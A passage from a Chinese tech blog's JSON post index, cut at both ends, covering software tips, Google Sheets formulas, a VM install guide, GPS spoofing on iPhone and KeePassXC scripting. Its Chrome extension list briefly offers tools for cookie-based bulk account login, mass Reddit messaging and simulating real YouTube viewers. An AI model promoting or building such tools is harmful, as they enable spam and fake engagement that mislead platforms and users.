2183016911709674 217 🏺️ 陶瓷 1998584480260291 218 🐈 猫展 2085764364800153 219 🐋 赏鲸 2010295879049273 220 🐎 骑马 2305882872810386 221 🐎 马球 2992444647448527 222 🐎 赛马 2036103313151167 223 🐎 牛仔竞技 2032053533484329 224 🐕 狗展 2033101433391796 225 🐕 赛狗 2063151573732303 226 🐕 狗狗敏捷性比赛 1970324359720206 227 🐠 浮潜 1991862170868754 228 👟 跑步 1944976138942614 229 👟 双人瑜伽 2356487634425765 230 👟 瑜伽 1900567776727129 231 👟 运动鞋收藏 1898758460179166 232 👟 体操 1806931616095752 233 👟 棍网球 2081494871889669 234 👟 摔跤 1880573578722317 235 👟 有氧运动 1960246730677270 236 👟 跑酷 2596178330394172 237 👟 散步 2060249030698811 238 👟 健身 2621858381217703 239 👟 长板 1753409444787070 240 👟 走绳 2027219723990750 241 👟 滑板 1900555686660784 242 👟 藤球 2343265812415066 243 👟 回力球 3025349254157509 244 👟 竞技体操 1947654318656200 245 👟 空中飞人 1993231074095900 246 👟 棒操 1673056282796637 247 👟 艺术体操 2066449556780848 248 👟 极限运动 1989457957782399 249 👟 极限飞盘 1865580330226648 250 👟 田径运动 2130529657025991 251 👟 泡健身房 1773102896123367 252 👟 越野跑 2012769952137506 253 👟 蹦床和单跳 1829257340529553 254 👻 灵异鬼怪 2553872924687171 255 💄 化妆艺术 2370565373013405 256 💄 美容化妆 1965402660180043 257 💅 美甲 2160475874003829 258 💍 珠宝制作 2148664775154133 259 💍 金属探测 1861137637327956 260 💤 睡觉 2091460634281145 261 💥 漫画 2630440323696552 262 💥 漫画书收藏 2086163708118598 263 💬 语言艺术 1991604710876621 264 💭 冥想 1945677052226787 265 💰 硬币收藏 1933301873383691 266 💻 版面设计 2367749766629250 267 💻 编写代码 2123765794341484 268 💻 写博客 2073434099388276 269 💻 制作电子产品 1949256718476457 270 💻 学编程 2527709477246906 271 💼 皮艺 2275389229162647 272 📃 纸艺 1799809343478730 273 📈 投资 2413553172020311 274 📕 装订 2160219727370338 275 📖 阅读 936057119851278 276 📚 读书会 2474168739276238 277 📝 写作 2083986845018080 278 📝 创意写作 1705965192836670 279 📝 诗歌 1852253684873873 280 📫 集邮 2046612448759196 281 📫 集邮 2095372767186649 282 📱 地理藏宝 2021834491195819 283 📸 摄影 1968978593183141 284 📸 微距摄影 2028422630583786 285 📸 人物摄影 2839241022760047 286 📸 大自然摄影 2176069505766272 287 📸 时尚摄影 1796729320456236 288 📸 风景摄影 1697782903659271 289 📸 野生动物摄影 2232599983494263 290 📸 黑白摄影 2355471774526446 291 📹 视频博客 2840739095951676 292 📺 看电视 1856028854496470 293 📽 看电影 1846801878772026 294 🔊 泡夜店 2403230333080860 295 🔎 邮筒寻宝 2040339312701926 296 🔥 烙画 2442592725815314 297 🔦 洞穴探险和潜水 2356450627762938 298 🔨 道具制作 1927661330683539 299 🔭 天文摄影 1971826782898463 300 🔭 观星 1978387402229154 301 🕯 蜡烛制作 2068457496510903 302 🕶 时尚造型 2056242654442599 303 🕹 街机游戏 1997761097005640 304 🖥️ 组装电脑 2054918974568811 305 🖥️ 动画 1763559423749629 306 🖥️ VR 世界构建 2803503936330315 307 🖥️ 3D 建模 2109014069157385 308 🗣 语言和语言学 961648463958731 309 🥁 太鼓 2564790263561202 310 🥁 打鼓 2196835110369070 311 🥁 行进管乐队 1724723167640037 312 🥅 盲人门球 2008533909263004 313 🥋 空手道 1912568512191199 314 🥋 跆拳道 2113508142089457 315 🥋 相扑 1730367927075345 316 🥋 柔道 2413532098688129 317 🥋 合气道 1918705348218829 318 🥋 席拉（马来武术） 2131289703577396 319 🥋 阿尼斯 1926622814081961 320 🥋 卡波耶拉舞 2378887365459077 321 🥋 踢拳 923543347769847 322 🥋 防身术 2082405861839283 323 🥋 武术 1932462620204497 324 🥋 泰拳 2176451512406713 325 🥋 太极 1853139644805151 326 🥋 以色列马珈术 2045848018794213 327 🥋 席拉（马来武术） 1656038921163123 328 🥋 截拳道 2401185489955226 329 🥋 武术（功夫） 1951932511551886 330 🥋 综合格斗 (MMA) 2029993347039630 331 🥋 巴西柔术 2426933150669661 332 🥋 欧洲历史武术 (HEMA) 2000833323327494 333 🥌 轮椅冰壶 2060494884026785 334 🥐 维也纳甜酥面包 2347401108635132 335 🥕 蔬菜园艺 2165103433521141 336 🥗 健康烹饪 1968062163277365 337 🥧 烘焙 2073180822704550 338 🥫 罐装与腌制 1925986074151258 339 🥽 潜水 2369830343067215 340 🦅 驯鹰术 2065688900182015 341 🧣 钩针编织 2339059866164995 342 🧣 编织 2154963807897905 343 🧵 服装缝制 2259977364049488 344 🚐 房车旅行 2127462243942510 345 🚗 汽车改装 2232678110157384 346 🚗 模型汽车 2478127925562310 347 🚗 开车 2145094738901681 348 🚗 车展 2287512461269597 349 🚲 自行车越野赛 2179383645434643 350 🛋 室内设计和装饰 2350002748405990 351 🛍️ 购物 2573832419301242 352 🛠️ 锻造 1798995740211313 353 🛢 绕桶赛 2495979770429250 354 🛣️ 公路旅行 2179005172152257 355 🛩️ 滑翔运动 2170633962999922 356 🛶 划船 1973676366034462 357 🛶 皮划艇 2070267956330028 358 🛶 皮划艇 1982036841834247 359 🛶 支腿皮划艇 1984698268246220 360 🛶 无障碍（残疾人）皮划艇 2184911408198192 361 🛷 雪橇犬比赛 1788509444605858 相关推荐： Facebook 专页类别列表 Facebook 小组徽章 Facebook 背景颜色列表 ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Facebook 爱好列表","feature":"","link":"https://dev-coco.github.io/post/Facebook-Hobbies/","stats":{"text":"9 min read","time":539000,"words":2056,"minutes":9},"date":"2022-05-22 11:30:24","dateFormat":"2022-05-22"},{"content":"这是一款免费、开源、跨平台的视频压缩软件，支持 Windows、macOS、Linux 系统。 官网：https://handbrake.fr/ Github 开源代码：https://github.com/HandBrake/HandBrake 使用方法 拖入视频。 根据视频的尺寸选择通用的参数。 选择视频输出的格式。 选择输出文件的路径和文件名。 点击 Start 按钮后就开始压缩视频了， 在 Dock 栏的应用程序图标会显示百分比格式的进度和剩余时间，输出完成后就会在设置好的路径输出文件。 超高压缩率参数 以下参数仅供参考，非常高的压缩率，但是对视频的质量也会有些影响。 选择 Very Fast 1080p30。 Filters 里的设置参数。 降低 FPS 值到 25，这个值不建议太低，否则视频看起来像有延迟的样子。 使用单声道的音频，并且降低采样率和比特率可以有效降低文件的大小。 压缩效果如下图 ","tags":[{"name":"Windows","slug":"windows","used":true,"link":"https://dev-coco.github.io/tag/windows/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"HandBrake 视频压缩工具","feature":"https://dev-coco.github.io/post-images/HandBrake-Video-Compress.png","link":"https://dev-coco.github.io/post/HandBrake-Video-Compress/","stats":{"text":"1 min read","time":54000,"words":255,"minutes":1},"date":"2022-05-12 13:39:49","dateFormat":"2022-05-12"},{"content":"两个小技巧，防止加行导致的引用偏移。 在引用单元格的时候，经常会遇到在引用的位置增加行，导致引用的位置偏移，没有达到预期的效果。 例如使用 SUM 函数计算 A2 到 A 列的合计。 但是在第一行的下面新增一行的时候，原先引用 A2:A 的位置就会被移动到 A3:A ，这样就会导致新增加的行是无法被 SUM 函数计算。 解决方法一 使用 INDIRECT 函数，以字符串的形式引用单元格。将原先 A2:A 改为 INDIRECT(&quot;A2:A&quot;)，因为是文本内容，所以无论怎么增加行都不会使引用的位置偏移。 但是这个方式也有一个弊端，在横向移动的时候，引用的列也不会改变。 解决方法二 在使用 INDIRECT 函数的基础上进行改进。 =SUM(INDIRECT(ADDRESS(ROW() + 1, COLUMN())&amp;&quot;:&quot;&amp;REGEXREPLACE(ADDRESS(ROW(), COLUMN(), 2), &quot;\\$.+&quot;, &quot;&quot;))) 先来拆分出来理解一下这个函数运行的过程。 首先是 ADDRESS(ROW() + 1, COLUMN())，使用 ADDRESS 函数配合 ROW 和 COLUMN 函数获取单元格自身的位置，不过要在 ROW 的位置加上 1，因为预期的效果是引用 A2:A。那么现在已经用 ADDRESS 函数获得了 $A$2，虽然是绝对引用，但并不会影响结果。 再使用 ADDRESS 函数用同样的方法，获取单元格自身的位置，不过在引用模式的参数设置 2，绝对引用行，这样的目的是为了接下来用正则表达式更方便的筛选。这个时候得到了一个 A$1，但是我们需要的是 A 列。 使用 REGEXREPLACE 函数，用正则表达式进行替换，正则表达式语法 \\$.+，获取从 $ 符号往后的所有字符，然后替换成空值。这样就得到了 A 列。 然后将前面的 $A$2 和 A 列用 &amp;（与号）拼接在一起。 ADDRESS(ROW() + 1, COLUMN())&amp;&quot;:&quot;&amp;REGEXREPLACE(ADDRESS(ROW(), COLUMN(), 2), &quot;\\$.+&quot;, &quot;&quot;) 这样就得到了一个引用的范围，$A$2:A。 再使用 INDIRECT 函数引用这个范围。 这样即使在下面添加行，引用的范围也不会偏移，同时横向移动的时候，引用的列也会自动改变成当前的列。 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 单元格引用小技巧","feature":"https://dev-coco.github.io/post-images/Google-Excel-Reference-Tips.png","link":"https://dev-coco.github.io/post/Google-Excel-Reference-Tips/","stats":{"text":"3 min read","time":133000,"words":597,"minutes":3},"date":"2022-05-09 13:44:40","dateFormat":"2022-05-09"},{"content":"Bitdefender 是一款由罗马尼亚的 Softwin 软件公司开发的杀毒软件。 180 天免费体验：活动链接 90 天免费体验：活动链接 仅限新用户，按照步骤使用邮箱注册一个账号即可激活。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"Bitdefender 免费试用活动","feature":"https://dev-coco.github.io/post-images/Bitdefender-Free-Trial.png","link":"https://dev-coco.github.io/post/Bitdefender-Free-Trial/","stats":{"text":"1 min read","time":13000,"words":65,"minutes":1},"date":"2022-05-04 19:17:41","dateFormat":"2022-05-04"},{"content":"Chrome 各类插件离线包合集。 Easy Clean v1.0.0 Manifest V3 一键快捷清理浏览器缓存，同时在关闭浏览器后自动进行缓存清理，以保护您的隐私安全。 下载 使用教程 Tutorial Background Color Post v1.0.7 Manifest V3 发布彩色背景帖文，可以附带图片。支持发布到小组或者时间线。 下载 使用教程 Tutorial 口袋 AI v1.0.1 Manifest V3 提示语侧边栏菜单，可自定义预设提示语。 下载 使用教程 Tutorial Prompt Menu v1.0.2 Manifest V3 提示语侧边栏菜单，可自定义预设提示语。 下载 使用教程 Tutorial Chrome 插件管理 v1.0.4 Manifest V3 点击开关即可控制插件开关和关闭，点击卸载按钮即可卸载插件，在上方的搜索框可以通过关键词搜索插件名称。 下载 自定义新分页链接 v1.0.1 Manifest V3 自定义打开新分页的链接。 下载 使用教程 Tutorial 元素选择器 v1.0.1 Manifest V3 自定义打开新分页的链接。 下载 使用教程 Tutorial 截图 OCR v1.0.0 Manifest V3 从网页截图中提取文本，并支持翻译功能。 下载 使用教程 修复电子表格分页限制 v1.0.1 Manifest V3 解决超过 100 人同时编辑电子表格的限制。 下载 使用教程 获取 WhatsApp 小组 v1.1.4 Manifest V3 快速列印 WhatsApp 小组链接，获取小组名字和头像。 下载 获取 Telegram 小组 v1.0.0 Manifest V3 快速列印 Telegram 小组链接，获取小组名字和头像。 下载 检测网页语言比例 v1.0.8 Manifest V3 检测网页语言比例，显示 Facebook 前 15 个贴文发布时间和点赞数量。 下载 显示图片标签 v1.1.1 Manifest V3 显示 Facebook 帖子图片中的 alt 标签。 下载 Skype 自动回复 v1.0.3 Manifest V2 Skype 自动回复用户自定义消息。 下载 使用教程 批量下载头像 v1.0.3 Manifest V3 这个插件可以设置年龄和性别，然后生成对应的头像。这些头像是由机器生成出来的，并不存在这个世界上，所以不会有版权和肖像权的问题，可以放心使用。 下载 使用教程 隐藏 WhatsApp 弹窗 v1.0.0 Manifest V3 隐藏 “您的电脑没有足够的空间” 弹窗。 下载 丝滑滚动 v1.0.1 Manifest V3 在 Facebook 大量滚动页面的时候，依然可以保持页面丝滑滚动，不会卡顿。 下载 修改浏览器标识 v1.0.3 Manifest V2 修改浏览器标识，模拟不同的设备请求网页。 下载 Timed-Reminders v1.0.2 Manifest V2 定时提醒，语音播报。模拟 YouTube 真实用户观看视频。 下载 Browser Resize v1.0.1 Manifest V3 根据配置自定义浏览器窗口大小和坐标。 下载 使用教程 日程记录 v1.0.5 Manifest V3 用来记录每个日程的时间并且记录。 下载 使用教程 ChatGPT Prompt v1.0.6 Manifest V2 自定义预设 ChatGPT 提示语。 下载 使用教程 Cookies Login v1.0.0 Manifest V3 使用 Cookies 批量登录账号。 下载 使用教程 Reddit 批量发送消息 v1.0.7 Manifest V3 自动化批量给指定用户发送消息。 下载 使用教程 Reddit_CN v1.0.1 Manifest V3 Reddit 界面非官方中文汉化。 下载 YouTube 自动回复 v1.0.9 Manifest V3 YouTube 自动回复视频和社区帖下的评论。 下载 使用教程 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Chrome 插件合集","feature":"","link":"https://dev-coco.github.io/post/Chrome-Extension-Collection/","stats":{"text":"4 min read","time":210000,"words":896,"minutes":4},"date":"2022-05-02 07:40:52","dateFormat":"2022-05-02"},{"content":"目前在市面上为数不多既支持 M1 芯片而且又免费的虚拟机软件。 本文仅对实用软件推荐，请自行甄别软件安全性。 下载 UTM 虚拟机 下载地址：https://mac.getutm.app/ 下载好后打开 UTM.dmg 文件，将图标拖到右侧的 Applications 文件夹。 下载镜像文件 打开 UTM 虚拟机，点击访问 UTM 镜像库。 M1 芯片安装虚拟机，目前只支持 ARM 架构，所以需要选择一个支持 ARM 构架的镜像，下面就以 Windows 11 为例。 申请 Windows 预览体验计划 打开链接：https://insider.windows.com/zh-cn/register 阅读完条款后，勾选同意条款，再点击立即注册。 点击立即开始外部测试后，就已经申请好了预览体验的权限。 打开链接：https://www.microsoft.com/en-us/software-download/windowsinsiderpreviewARM64 点击蓝色的按钮下载镜像文件。 下载 SPICE Guest Tools 工具 打开链接：https://mac.getutm.app/support/ 点击 Download 开始下载。 创建虚拟机 打开 UTM 虚拟机，点击新建一个虚拟机。 选择虚拟化。 操作系统选择 Windows。 选择刚才下载好的 Windows 11 磁盘镜像，vhdx 后缀文件。 根据电脑配置自定义使用的内存和 CPU 核心数。 剩下的步骤按照默认设置，下一步就可以了。完成后运行虚拟机。 虚拟机运行后按照界面说明的步骤设置即可，当设置到网络这个步骤的时候会发现没有可选的项目。 键盘按 Shift + F10 打开命令提示符，输入 OOBE\\BYPASSNRO 然后会自动重启系统。当再次设置到网络这个步骤的时候，会多出一个 I don't have internet 选项。 点击 Continue with limited setup 选项。 全部设置好，进入系统后，这个时候是没有网络的，还需要进一步的设置。 选择磁盘工具，加载 SPICE Guest Tools 工具。 在 D 盘找到 spice-guest-tools-xxx.exe 文件并且运行，安装完成后重启系统，然后就可以正常联网了。 ","tags":[{"name":"Windows","slug":"windows","used":true,"link":"https://dev-coco.github.io/tag/windows/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"MacOS M1 芯片安装虚拟机","feature":"https://dev-coco.github.io/post-images/M1-Chip-Install-VM.png","link":"https://dev-coco.github.io/post/M1-Chip-Install-VM/","stats":{"text":"2 min read","time":118000,"words":531,"minutes":2},"date":"2022-04-20 04:09:12","dateFormat":"2022-04-20"},{"content":"设备无需越狱即可自定义修改 GPS 定位。 打开 Xcode，点击 Create a new Xcode project。 选择 iOS 然后创建一个 App。 自定义 Product Name，设置项目的名字。 在当前项目添加一个文件。 选择 GPX File。 创建项目。 在 lat 和 long 可以设置经纬度参数，name 是对应地理位置的名字。 在 Google 地图上右键获取指定位置的经纬度。 使用数据线将 iPhone 连接上电脑，然后在 Xcode 选择自己的设备。 在 Signing &amp; Capabilities 点击 Add Account… 添加一个账号。 按照步骤登陆 Apple ID。 选择对应的 Apple ID 后编译代码，对应用程序进行签名。 输入开机密码，点击始终允许，在此过程中设备需要解锁屏幕。 如果是第一次运行，会出现下图的错误。 然后在iPhone上会显示「不受信任的开发者」。 通用 &gt; VPN 与 设备管理 &gt; 开发者 APP &gt; 信任。 在 Xcode 再次运行程序就可以正常运行了。 把设备的定位打开，隐私 &gt; 定位服务 &gt; 定位服务。 注意：在使用的过程中 iPhone 需要打开编译好的 App。如果要修改不同的经纬度，需要在 Xcode 修改好经纬度的值，然后重新编译安装到 iPhone 上运行才能生效。 ","tags":[{"name":"iOS","slug":"ios","used":true,"link":"https://dev-coco.github.io/tag/ios/"}],"title":"iPhone 免越狱虚拟定位","feature":"https://dev-coco.github.io/post-images/iPhone-Fake-Location.png","link":"https://dev-coco.github.io/post/iPhone-Fake-Location/","stats":{"text":"2 min read","time":75000,"words":343,"minutes":2},"date":"2022-04-09 21:53:45","dateFormat":"2022-04-09"},{"content":"加载大量 Facebook 帖子的时候，浏览器就会出现卡顿的情况。 在 Facebook 加载帖子的时候，每一个帖子都会新增 div 元素。 每个父元素下面会增加很多的子元素，这样就会使用大量的资源去渲染，造成浏览器卡顿。 那么可以将下面的子元素清空掉，并且保持原贴的高度，这样就可以解决大量的元素造成卡顿的问题了。 注意：移除掉的元素不会再恢复回来了。 源码链接：https://github.com/dev-coco/Smooth-Scroll ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"优化 Facebook 浏览速度","feature":"https://dev-coco.github.io/post-images/Facebook-Browsing-Boost.png","link":"https://dev-coco.github.io/post/Facebook-Browsing-Boost/","stats":{"text":"1 min read","time":31000,"words":150,"minutes":1},"date":"2022-04-09 08:05:27","dateFormat":"2022-04-09"},{"content":"申请 Google API 密钥的方法。 申请链接：https://console.cloud.google.com/apis/ 在上方点击选择项目，如果之前有创建过，点击项目的名称。 点击右上角的新建项目。 自定义项目名称，点击创建。 点击左侧的凭据。 在上方点击创建凭据，选择 API 密钥。 这样就申请好 Google 的API 密钥了。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"申请 Google API 密钥","feature":"https://dev-coco.github.io/post-images/Create-Google-API-Key.png","link":"https://dev-coco.github.io/post/Create-Google-API-Key/","stats":{"text":"1 min read","time":21000,"words":97,"minutes":1},"date":"2022-04-05 07:08:47","dateFormat":"2022-04-05"},{"content":"自助问答客服是一个根据关键词快速回复自定义内容的网页。 源码：https://github.com/dev-coco/Customer-Service 预览效果：问题自助解答 配置 创建一个 Google 表格，表格的权限要设置成查看权限。 在表格的 A 列输入关键词，如果有多个关键词，可以使用换行设置多个。 在表格的 B 列输入回复的内容。B 列的内容可以使用 HTML 标签。 如果在 B 列放入可点击的关键词，需要在 class 属性添加 k，例如： &lt;span class=&quot;k&quot;&gt;可点击关键词&lt;/span&gt; 下面是表格里面设置的例子，A 列的关键词有「初始化」、「菜单」和「帮助」，那么输入任意一个关键词的时候，就会触发 B 列对应的内容。 然后「初始化」关键词会回复对应的内容，里面有一个可点击关键词，所以点击后会触发第二行「脚本基础教程目录」对应的内容。 &lt;span class=&quot;k&quot;&gt;Google 脚本基础教程目录&lt;/span&gt; 效果如下 如果需要使用超链接，使用 HTML 中的 a 标签即可。 &lt;a href=&quot;链接&quot;&gt;关键词&lt;/a&gt; 成品 将 Google 表格的 ID 替换下面的链接即可使用。 https://dev-coco.github.io/other/Customer-Service.html?sheet=这里输入表格链接 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"自助问答客服","feature":"https://dev-coco.github.io/post-images/Customer-Service.png","link":"https://dev-coco.github.io/post/Customer-Service/","stats":{"text":"2 min read","time":82000,"words":358,"minutes":2},"date":"2022-04-04 09:08:24","dateFormat":"2022-04-04"},{"content":"使用命令行批量创建 KeePass 数据库。 最近需要创建多个 KeePass 数据库，但是一个一个手动创建太花时间了，后来发现原来 KeePassXC 内置有 CLI 命令行工具。路径在：/Applications/KeePassXC.app/Contents/MacOS/keepassxc-cli 创建 KeePassXC 数据库 语法如下： printf &quot;%s\\n%s&quot; &quot;密码&quot; &quot;密码&quot; | /Applications/KeePassXC.app/Contents/MacOS/keepassxc-cli db-create -p 文件名字.kdbx 命令详解： db-create 是用来创建数据库的参数。 Usage: keepassxc-cli db-create [options] database Create a new database. Options: -q, --quiet Silence password prompt and other secondary outputs. -k, --set-key-file &lt;path&gt; Set the key file for the database. -p, --set-password Set a password for the database. -t, --decryption-time &lt;time&gt; Target decryption time in MS for the database. -h, --help Display this help. Arguments: database Path of the database. 使用 -p 参数设置密码，在后面设置创建的文件名字，以 kdbx 结尾。 /Applications/KeePassXC.app/Contents/MacOS/keepassxc-cli db-create -p demo.kdbx Enter password to encrypt database (optional): Repeat password: 接下来会要求重复输入两遍密码，然后就创建完成了。 Successfully created new database. 使用 printf 命令预设好密码。 %s 是格式代替符，会输出字符串。 \\n 代表换行。 后面引号的参数就是 %s 要输出的内容。 printf &quot;%s\\n%s&quot; &quot;123456&quot; &quot;123456&quot; 意思就是 %s 输出第一行密码 123456，然后 \\n 换行，第二个 %s 输出第二行密码 123456。 设置 KeePassXC 数据内的项目 语法如下： printf &quot;%s\\n%s&quot; &quot;KeePassXC密码&quot; &quot;密码&quot; | /Applications/KeePassXC.app/Contents/MacOS/keepassxc-cli add &quot;文件名.kdbx&quot; --u &quot;用户名&quot; --url &quot;链接&quot; -p &quot;标题&quot; 命令详解： add 是用来新增数据库项目的参数。 Usage: keepassxc-cli add [options] database entry Add a new entry to a database. Options: -q, --quiet Silence password prompt and other secondary outputs. -k, --key-file &lt;path&gt; Key file of the database. --no-password Deactivate password key for the database. -y, --yubikey &lt;slot[:serial]&gt; Yubikey slot and optional serial used to access the database (e.g., 1:7370001). -u, --username &lt;username&gt; Username for the entry. --url &lt;URL&gt; URL for the entry. -p, --password-prompt Prompt for the entry's password. -g, --generate Generate a password for the entry. -L, --length &lt;length&gt; Length of the generated password -l, --lower Use lowercase characters -U, --upper Use uppercase characters -n, --numeric Use numbers -s, --special Use special characters -e, --extended Use extended ASCII -x, --exclude &lt;chars&gt; Exclude character set --exclude-similar Exclude similar looking characters --every-group Include characters from every selected group -h, --help Display this help. Arguments: database Path of the database. entry Path of the entry to add. 在 add 参数后面需要设置一个数据库文件。 --u 参数设置用户名。 --url 参数设置链接，如果没有链接，引号内可以留空，或者不使用这个参数。 -p 参数设置标题。 /Applications/KeePassXC.app/Contents/MacOS/keepassxc-cli add &quot;demo.kdbx&quot; --u &quot;Admin&quot; --url &quot;https://dev-coco.github.io&quot; -p &quot;测试内容&quot; Enter password to unlock demo.kdbx: Enter password for new entry: 接下来会要求输入数据库的密码，然后再输入项目的密码。 Successfully added entry 测试内容. 自动化生成器 首先，在 Excel 表格内按照下图第一行的表头设置好内容，链接为可选填项。 然后把 Excel 表格里设置好的内容复制粘贴到 KeePassXC 批量生成器 左边的输入框。点击生成按钮后，在右侧就会输出生成好的 Shell 命令。 最后把输出的命令复制粘贴到 Terminal 里运行。在当前目录下就会批量创建设置好的数据库了。 ","tags":[{"name":"Shell","slug":"shell","used":true,"link":"https://dev-coco.github.io/tag/shell/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"命令行批量创建 KeePassXC 数据库","feature":"https://dev-coco.github.io/post-images/Batch-Create-KeePassXC-Database.png","link":"https://dev-coco.github.io/post/Batch-Create-KeePassXC-Database/","stats":{"text":"5 min read","time":241000,"words":852,"minutes":5},"date":"2022-03-16 10:25:36","dateFormat":"2022-03-16"},{"content":"Facebook 小组徽章 ID 和类型。 序号 名字 徽章类型 ID 1 管理员 ADMIN 1593744847475603 2 版主 MODERATOR 1254110058260458 3 小组专家 EXPERT 131647715479949 4 新成员 NEW_MEMBER 233461454554974 5 超级新人 RISING_STAR 772909320138306 6 配图帝 VISUAL_STORYTELLER 1004429206693197 7 话题王 ACTIVE_MEMBER 2409022109399311 8 创始成员 FOUNDING_MEMBER 426408264984950 9 解惑高人 暂未找到 1784222205086383 10 小组大使 GROUP_AMBASSADOR 361590721974950 相关推荐： Facebook 专页类别列表 Facebook 爱好列表 Facebook 背景颜色列表 ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Facebook 小组徽章","feature":"https://dev-coco.github.io/post-images/facebook-badge.png","link":"https://dev-coco.github.io/post/facebook-badge/","stats":{"text":"1 min read","time":27000,"words":108,"minutes":1},"date":"2022-03-04 21:23:04","dateFormat":"2022-03-04"},{"content":"屏蔽 “您的电脑没有足够的空间来运行 WhatsApp。” 提示弹窗。 不知为何 WhatsApp 总是弹出 “您的电脑没有足够的空间来运行 WhatsApp。请从您的电脑中删除久未使用文件来腾出更多的存储空间，然后再次登陆。” 这样的弹窗，即使有很多空闲的内存依然会提示。 于是查看了一下弹窗的源码。 那么就可以在 _209uk 这个 class 增加一个 css 样式隐藏弹窗。 不过需要使用 Chrome 插件加载网页时就注入 css。 补充： 后来发现以上的方法会引起一些问题，有的功能也会使用 _209uk 这个 class，这样会导致其它的功能无法正常使用。需要根据指定目录定位到弹窗的 class，然后进行屏蔽。 不过后来发现有时候会出现 LayoutApp 这个类，有时候不会出现，所以需要写两种 css。 ","tags":[{"name":"WhatsApp","slug":"whatsapp","used":true,"link":"https://dev-coco.github.io/tag/whatsapp/"}],"title":"屏蔽 WhatsApp 提示弹窗","feature":"https://dev-coco.github.io/post-images/Hide-WhatsApp-Alert.png","link":"https://dev-coco.github.io/post/Hide-WhatsApp-Alert/","stats":{"text":"1 min read","time":51000,"words":245,"minutes":1},"date":"2022-02-22 21:45:50","dateFormat":"2022-02-22"},{"content":"Image-Gallery 是一个专门为预览图片打造的静态网页。 演示页面：Image-Gallery-Demo 主题源码：Image-Gallery 特点 图片高清预览。 图片异步延迟加载。 超快的加载速度。 根据图片名称搜索图片。 自助反馈表单。 自适应排版。 放大图片。 下载图片。 分级菜单。 建站 目录 . ├── script │ ├── code.gs │ └── sidebar.html └── source ├── image-gallery │ └── index.html ├── index.html ├── instruction.html ├── search.html └── src ├── core.css ├── core.js ├── favicon.ico ├── fontawesome-webfont.ttf ├── logo.png ├── script.js └── search.js script 文件夹内是配套 Google 表格的脚本，用于生成代码。 建立一个 Google 表格，菜单栏点击扩展程序，选择 Apps 脚本。 需要使用新版的编辑器，放入 code.gs 文件里的内容。然后点击 (➕) 加号，新建一个 HTML 文件。 文件名字命名为 sidebar，再放入 sidebar.html 文件内的代码。 以上步骤设置完成后，刷新 Google 表格，在菜单栏会出现扩展功能。 获取文件 在 Google 表格的 A1 单元格放入文件夹 ID，点击获取文件功能。 如果是第一次使用，需要授权才可以运行。点击继续。 选择 Google 账号。 点击高级。 转至项目。 点击允许。 点击后就可以获取到文件夹内的文件和对应的 ID 了。 删除内容 会从第二行开始删除以下的内容。 生成代码 点击后会在右侧出现一个界面，把获取好的文件名称和 ID 放在输入框内，点击对应的按钮就会生成出代码并且复制到剪切板，不会有任何提示。 source image-gallery 在这个文件夹内创建需要分类的文件夹，每个文件夹内放入 index.html 文件。 image-gallery &gt; index.html 预览图片。使用生成代码的图片功能生成代码，替换 index.html 中注释的部分。 instruction.html 打开页面后显示的说明页面。 source &gt; index.html 自定义侧边菜单栏，在 id 内放入 image-gallery 文件夹内对应的路径。submenu 类是子菜单。 在界面左上角有三个按钮，第一个按钮用来打开侧边栏菜单，点击第二个按钮将缩略图替换成原图尺寸，第三个按钮点击后会打开自助反馈表单。 search.html 用于搜索功能，根据文件名字搜索图片。搜索的清单来自于 search.js 文件。src 的内容需要改成对应的目录，下面是默认值。 &lt;script src=&quot;src/search.js&quot;&gt;&lt;/script&gt; src search.js 搜索功能的清单。使用生成代码的搜索功能生成代码，替换文件内演示的部分。 自定义 script.js src 的值需要改成对应的网站目录，下图是默认值。 botToken 和 userID 需要替换，替换教程请查看：创建 Telegram 机器人 favicon.ico 网站图标，32 * 32 像素。 logo.png 主页 Logo，建议尺寸 500 * 210 像素。 image-gallery &gt; index.html 自定义网站标题。 &lt;title&gt;Image Gallery&lt;/title&gt; 全部配置完成后需要部署到服务器运行。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Image-Gallery 图片网站主题","feature":"https://dev-coco.github.io/post-images/image-gallery.png","link":"https://dev-coco.github.io/post/image-gallery/","stats":{"text":"3 min read","time":179000,"words":785,"minutes":3},"date":"2022-02-20 18:07:31","dateFormat":"2022-02-20"},{"content":"用于查询网站是否存在 404 链接的工具。 从 软件列表 下载 Check 404 Links 工具。 如何使用 运行程序，然后放入主页链接，点击继续。 通知中心会出现下图的提示，大概等待 5 到 10 分钟，如果是大型网站会需要等更久一些时间，程序会持续在后台运行。 当通知中心提示完成，程序会自动打开“404 Links.txt”这个文件，如果没有内容说明没有 404 链接。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"查 404 链接工具","feature":"https://dev-coco.github.io/post-images/Check-404-Links.png","link":"https://dev-coco.github.io/post/Check-404-Links/","stats":{"text":"1 min read","time":28000,"words":132,"minutes":1},"date":"2022-02-08 20:56:27","dateFormat":"2022-02-08"},{"content":"AutoType 